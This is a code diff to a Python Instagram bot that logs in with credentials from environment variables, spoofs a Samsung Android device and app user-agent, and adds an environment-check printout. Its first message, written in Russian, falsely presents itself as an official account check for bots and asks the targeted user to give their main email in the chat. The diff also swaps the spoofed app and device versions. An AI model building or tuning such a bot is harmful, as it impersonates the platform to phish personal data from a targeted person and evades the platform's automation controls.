@@ -5,6 +5,12 @@ USERNAME = os.environ.get("IG_USER")
 PASSWORD = os.environ.get("IG_PASS")
 TARGET   = os.environ.get("IG_TARGET")
 
+print("=== ENV CHECK ===")
+print("IG_USER =", USERNAME)
+print("IG_PASS set:", bool(PASSWORD))
+print("IG_TARGET =", TARGET)
+print("=================")
+
 FIRST_MSG = (
     "Здравствуйте! Это официальная проверка пользователей на наличие ботов. "
     "Для подтверждения вашего аккаунта укажите основной email прямо в этом чате — "
@@ -34,23 +40,22 @@ def run_bot():
         return
 
     cl = Client()
-    
-    # ПРИНУДИТЕЛЬНО ставим свежий user-agent ПЕРЕД логином
+    # ПРИНУДИТЕЛЬНО ставим свежий user-agent
     cl.set_user_agent(
-        "Instagram 460.0.0.30.94 Android (34/14.0; 420dpi; 1080x2400; "
-        "samsung; SM-G991B; o1s; exynos2100; en_US; 372382791)"
+        "Instagram 446.0.0.49.77 Android (33/13.0; 420dpi; 1080x2400; "
+        "samsung; SM-G991B; o1s; exynos2100; en_US; 368094334)"
     )
     cl.set_device({
-        "app_version": "460.0.0.30.94",
-        "android_version": 34,
-        "android_release": "14.0",
+        "app_version": "446.0.0.49.77",
+        "android_version": 33,
+        "android_release": "13.0",
         "dpi": "420dpi",
         "resolution": "1080x2400",
         "manufacturer": "samsung",
         "device": "o1s",
         "model": "SM-G991B",
         "cpu": "exynos2100",
-        "version_code": "372382791",
+        "version_code": "368094334",
     })
 
     try:
